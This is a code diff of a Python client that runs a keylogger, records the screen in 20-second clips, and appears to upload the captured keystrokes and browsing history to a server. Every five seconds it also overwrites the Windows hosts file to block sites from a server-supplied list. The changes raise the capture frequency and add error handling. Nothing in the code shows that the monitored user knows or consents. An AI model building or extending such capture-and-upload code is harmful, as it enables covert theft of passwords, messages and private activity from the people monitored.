@@ -12,6 +12,7 @@ import _thread
 import schedule
 from keylogger import start_keylogger
 
+
 username = ""
 url = 'http://127.0.0.1:8000/'
 send_url = url + 'send/'
@@ -73,7 +74,7 @@ def screen_record():
     # create the video write object]
     time_now = str(int(time()))
     out = cv2.VideoWriter("output" + time_now + "_" + username + ".avi", fourcc, FPS, SCREEN_SIZE)
-    end = time() + 60
+    end = time() + 20
     while time() < end:
         # make a screenshot
         img = pyautogui.screenshot()
@@ -107,6 +108,9 @@ def screen_record_thread():
 
 
 def keylogger_send():
+    f = open("keylogs.txt", "a")
+    f.write('')
+    f.close()
     f = open("keylogs.txt", "r")
     x = f.read()
     print("data from file: " + x)
@@ -118,29 +122,38 @@ def keylogger_send():
 
 
 def block_url():
-    r = requests.get(send_url + "blockedurls/", params={'user': username})
-    print(r)
-    urls_string = r.text
-    urls = urls_string.split("  ")
-    print(urls)
-    if urls[0] == "ok":
-        urls = urls[1:]
+    try:
+        r = requests.get(send_url + "blockedurls/", params={'user': username})
+        print(r)
+        urls_string = r.text
+        urls = urls_string.split("  ")
         print(urls)
-        # Windows host file path
-        hostsPath = r"C:\Windows\System32\drivers\etc\hosts"
-        redirect = "127.0.0.1"
-        content = ""
-        with open(hostsPath, 'w') as file:
-            for site in urls:
-                content = content + redirect + " " + site + "\n"
-            file.write(content)
-            file.close()
+        if urls[0] == "ok":
+            urls = urls[1:]
+            print(urls)
+            # Windows host file path
+            hostsPath = r"C:\Windows\System32\drivers\etc\hosts"
+            redirect = "127.0.0.1"
+            content = ""
+            with open(hostsPath, 'w') as file:
+                for site in urls:
+                    content = content + redirect + " " + site + "\n"
+                file.write(content)
+                file.close()
+    except requests.exceptions.RequestException as err:
+        print("no connection", err)
 
 def program_run():
     schedule.every(5).seconds.do(block_url)
     schedule.every().minute.at(':00').do(screen_record_thread)
     schedule.every().minute.at(':00').do(keylogger_send)
     schedule.every().minute.at(':00').do(history_send)
+    schedule.every().minute.at(':20').do(screen_record_thread)
+    schedule.every().minute.at(':20').do(keylogger_send)
+    schedule.every().minute.at(':20').do(history_send)
+    schedule.every().minute.at(':40').do(screen_record_thread)
+    schedule.every().minute.at(':40').do(keylogger_send)
+    schedule.every().minute.at(':40').do(history_send)
     while True:
         schedule.run_pending()
         sleep(1)
